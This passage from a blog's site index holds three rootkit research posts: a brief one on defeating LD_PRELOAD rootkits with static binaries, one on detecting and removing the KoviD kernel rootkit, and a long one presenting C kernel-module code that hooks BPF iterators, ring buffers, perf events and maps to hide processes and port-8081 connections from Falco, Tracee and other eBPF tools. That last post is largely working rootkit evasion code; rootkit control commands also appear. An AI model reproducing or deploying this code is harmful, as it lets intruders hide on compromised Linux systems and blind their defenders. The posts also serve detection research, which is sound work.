LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca 